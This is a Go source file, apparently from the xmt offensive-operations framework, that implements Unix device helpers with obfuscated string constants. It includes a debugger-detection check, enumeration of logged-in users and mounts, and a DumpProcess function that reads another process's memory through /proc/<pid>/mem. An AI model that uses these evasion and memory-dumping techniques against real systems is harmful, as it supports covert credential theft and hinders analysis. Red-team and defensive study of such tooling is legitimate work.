//go:build !windows && !js && crypt

// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package device

import (
	"io"
	"os"
	"runtime"
	"strconv"
	"strings"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/util/crypt"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

var (
	// Shell is the default machine specific command shell.
	Shell = crypt.Get(32) // /bin/sh
	// ShellArgs is the default machine specific command shell arguments to run
	// commands.
	ShellArgs = crypt.Get(33) // -c
	// PowerShell is the path to the PowerShell binary, which is based on the
	// underlying OS type.
	PowerShell = crypt.Get(34) // pwsh
	home       = crypt.Get(35) // $HOME
)

// IsDebugged returns true if the current process is attached by a debugger.
func IsDebugged() bool {
	b, err := os.ReadFile(crypt.Get(36)) // /proc/self/status
	if err != nil {
		return false
	}
	for _, e := range strings.Split(string(b), "\n") {
		if len(e) <= 9 {
			continue
		}
		if e[9] == ':' && e[8] == 'd' && e[0] == 'T' && e[1] == 'r' && e[5] == 'r' {
			return e[len(e)-1] != '0' && e[len(e)-2] != ' ' && e[len(e)-2] != 9 && e[len(e)-2] != '\t'
		}
	}
	return false
}

// Logins returns an array that contains information about current logged
// in users.
//
// This call is OS-independent but many contain invalid session types.
//
// Always returns an EINVAL on WSAM/JS.
func Logins() ([]Login, error) {
	b, err := os.ReadFile(crypt.Get(37)) // /var/run/utmp
	if err != nil {
		return nil, err
	}
	return readWhoEntries(b), nil
}

// Mounts attempts to get the mount points on the local device.
//
// On Windows devices, this is the drive letters available, otherwise on nix*
// systems, this will be the mount points on the system.
//
// The return result (if no errors occurred) will be a string list of all the
// mount points (or Windows drive letters).
func Mounts() ([]string, error) {
	// 0 - READONLY
	f, err := os.OpenFile(crypt.Get(38), 0, 0) // /proc/self/mounts
	if err != nil {
		// 0 - READONLY
		if f, err = os.OpenFile(crypt.Get(39), 0, 0); err != nil { // /etc/mtab
			return nil, xerr.Wrap("cannot find mounts", err)
		}
	}
	b, err := io.ReadAll(f)
	if f.Close(); err != nil {
		return nil, err
	}
	var (
		e = strings.Split(string(b), "\n")
		m = make([]string, 0, len(e))
	)
	for _, v := range e {
		x, l := 0, 0
		for s := 0; s < 2; s++ {
			for l = x; x < len(v)-1 && v[x] != ' ' && v[x] != 9; x++ {
			}
			if x < len(v)-1 && s == 0 {
				x++
			}
		}
		if l == x {
			continue
		}
		m = append(m, v[l:x])
	}
	return m, nil
}

// DumpProcess will attempt to copy the memory of the targeted Filter to the
// supplied Writer. This fill select the first process that matches the Filter.
//
// If the Filter is nil or empty or if an error occurs during reading/writing
// an error will be returned.
func DumpProcess(f *filter.Filter, w io.Writer) error {
	if f.Empty() {
		return filter.ErrNoProcessFound
	}
	p, err := f.SelectFunc(nil)
	if err != nil {
		return err
	}
	v := crypt.Get(12) + strconv.FormatUint(uint64(p), 10) // /proc/
	b, err := os.ReadFile(v + crypt.Get(40))               // /maps
	if err != nil {
		return err
	}
	// 0 - READONLY
	d, err := os.OpenFile(v+crypt.Get(41), 0, 0) // /mem
	if err != nil {
		return err
	}
	for _, e := range strings.Split(string(b), "\n") {
		if err = parseLine(e, d, w); err != nil {
			break
		}
	}
	d.Close()
	runtime.GC()
	FreeOSMemory()
	return err
}
